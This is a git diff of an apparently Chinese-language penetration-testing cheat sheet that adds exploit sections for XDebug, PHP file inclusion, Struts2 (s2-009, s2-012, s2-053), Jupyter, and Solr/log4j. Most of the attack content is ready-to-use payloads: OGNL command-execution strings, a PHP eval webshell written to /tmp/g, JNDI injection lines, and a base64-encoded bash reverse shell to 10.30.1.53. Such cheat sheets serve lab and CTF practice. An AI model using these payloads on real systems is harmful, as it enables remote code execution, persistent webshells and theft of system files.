@@ -12,6 +12,8 @@
     - [phpmyadmin](#phpmyadmin)
         - [CVE-2016-5734](#CVE-2016-5734)
         - [CVE-2018-12613](#CVE-2018-12613)
+    - [XDebug-RCE](#XDebug-RCE)
+    - [inclusion](#inclusion)
 - [Python](#Python)
     - [Flask](#Flask)
         - [Jinja2](#Jinja2)
@@ -19,6 +21,7 @@
 - [Struts2](#Struts2)
     - [s2-013](#s2-013)
     - [s2-045](#s2-045)
+    - [s2-053](#s2-053)
 - [Ruby](#Ruby)
     - [Rails](#Rails)
         - [CVE-2019-5418](#CVE-2019-5418)
@@ -36,6 +39,8 @@
 
 - [uWSGI](#uWSGI)
     - [CVE-2018-7490](#CVE-2018-7490)
+- [Jupyter](#Jupyter)
+    - [notebook-rce](#notebook-rce)
 
 
 
@@ -51,6 +56,8 @@
     - [CVE-2017-12615](#CVE-2017-12615)
     - [Tomcat8+弱口令+后台getshell漏洞](#Tomcat8+弱口令+后台getshell漏洞)
 
+- [Apache-Solr](#Apache-Solr)
+    - [log4j组件](#log4j组件)
 - [Apache](#Apache)
     - [log4j2](#log4j2)
         - [CVE-2021-44228-log4j2-rce漏洞](#CVE-2021-44228-log4j2-rce漏洞)
@@ -199,6 +206,40 @@ SELECT `<?php fputs(fopen("a.php","w"),'<?php eval($_POST[a]);?>');?>`;
 
 蚁剑添加，密码为a
 
+### XDebug-RCE
+
+XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1：
+```
+xdebug.remote_connect_back = 1
+xdebug.remote_enable = 1
+```
+
+这个配置下，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。
+
+[exp脚本](https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py)该脚本是一个反向连接的过程，公网的需要VPS
+
+`python3 exp.py -t http://node4.buuoj.cn:26521/ -c 'shell_exec('id');'`
+
+![image](./img/xdebug1.png)
+
+### inclusion
+
+PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。
+
+[exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)
+
+```python2
+python exp.py your-ip 8080 100
+```
+
+利用脚本exp.py实现了上述过程，成功包含临时文件后，会执行`<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>`，写入一个新的文件`/tmp/g`，这个文件就会永久留在目标机器上。
+
+包含成功的话
+
+`lfi.php?file=/tmp/g&1=system(%27ls%27);`
+
+- 参考文章
+    - https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md
 ## Python
 ### Flask
 #### Jinja2
@@ -212,7 +253,7 @@ http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__su
 在popen输入要执行的命令
 
 env:打印环境变量
-id:
+id
 
 ### Django
 
@@ -225,6 +266,38 @@ id:
 
 S2-046以后的洞难以扫出来，需要自己寻找利用点，简单来说没有通用的链
 
+其它利用工具：https://github.com/HatBoy/Struts2-Scan
+
+### s2-009
+影响版本: 2.1.0 - 2.3.1.1
+
+
+id
+```
+/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
+```
+
+env
+```
+/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
+```
+
+
+
+### s2-012
+
+影响版本：2.1.0 - 2.3.13
+
+payload:(读取etc/passwd文件)
+```
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+```
+
+打印env环境变量
+```
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+```
+
 ### s2-013
 ### s2-045
 
@@ -232,7 +305,19 @@ S2-046以后的洞难以扫出来，需要自己寻找利用点，简单来说�
 
 影响版本: Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10
 
+Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。
 
+漏洞复现：(以下是一个提交页面)
+
+http://your-ip:8080/hello.action
+
+输入如下payload：
+
+```这里是需要回车的
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+
+```
+![image](./img/s2-053.png)
 ## Ruby
 
 ### Rails
@@ -426,6 +511,21 @@ http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd
 ```
 
 ![image](./img/uWSG.png)
+
+## Jupyter
+
+Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。
+### notebook-rce
+
+Jupyter Notebook 未授权访问漏洞
+
+如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。
+
+![image](./img/jupyter-rce1.png)
+![image](./img/jupyter-rce2.png)
+
+
+
 ## Imagetragick
 
 ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。
@@ -584,7 +684,15 @@ run
 - https://www.cnblogs.com/qianxinggz/p/13440366.html
 
 
+## Apache-solr
+### log4j组件
 
+Apache Solr Log4j组件 远程命令执⾏漏洞
+
+payload：
+```
+/solr/admin/collections? action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
+```
 ## Apache
 ### Log4j2
 
@@ -608,7 +716,7 @@ sh -i >& /dev/tcp/10.30.1.49/7777 0>&1
 
 https://www.jackson-t.ca/runtime-exec-payloads.html
 
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMzAuMS40OS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 10.30.1.49
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMzAuMS41My83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 10.30.1.53
 
 
 
@@ -622,7 +730,7 @@ POST /hello HTTP/1.1
 Host: vulfocus.fofa.so:30484
 Content-Type: application/x-www-form-urlencoded
 
-payload="${jndi:rmi://1.117.51.253:1099/pnlvzg}"
+payload="${jndi:rmi://10.30.1.53:1099/2yv22e}"
 ```
 
 ![image](./img/log4j2-2.png)
